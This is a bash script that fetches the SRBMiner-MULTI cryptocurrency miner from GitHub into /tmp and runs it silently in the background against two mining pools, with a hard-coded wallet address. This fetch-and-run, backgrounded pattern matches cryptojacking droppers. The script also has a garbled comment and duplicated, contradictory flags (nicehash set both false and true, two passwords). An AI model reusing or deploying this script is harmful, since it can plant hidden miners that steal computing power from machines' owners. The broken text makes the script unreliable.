#!/bin/bash

# Go to /tmp
cd /tmp

# Download latest SRBMiner-MULTI release (auto-fetches newest version)
LATEST_URL=$(curl -s https://api.github.com/repos/doktor83/SRBMiner-Multi/releases/latest \
  | grep browser_download_url \
  | grep "Linux.tar.gz" \
  | cut -d '"' -f 4)

# Download file
wget -O srbminer.tar.gz "$LATEST_URL"

# Extract
tar -xf srbminer.tar.gz
# Find the extracted directory automatically
SRB_DIR=$(find /tmp -maxdepth 1 -type d -name "SRBMiner-Multi*" | head -n 1)

cd "$SRB_DIR" || { echo "Failed to enter SRBMiner directory"; exit 1; }

chmod +x SRBMiner-MULTI


# Run miner in backgrouSRBMiner-Multi-3-0-6nd
./SRBMiner-MULTI \
  --multi-algorithm-job-mode 3 \
  --algorithm randomepic \
  --algorithm randomx \
  --pool 51pool.online:3416 \
  --pool fr-salvium.miningocean.org:8462 \
  --wallet farington#Worker01 \
  --wallet SC11qbqjQfdRrSUuis6ubxRfcvw5dBD1TfLBsVdciBTyjW9M2RCAppCY5vnaDgmJzk1T8SWm68my7CfQWURMdeox3GrSiKF5sm \
  --password Worker01 \
  --password not \
  --keepalive true \
  --keepalive true \
  --nicehash false \
  --nicehash true \
  &>/tmp/srbminer.log &
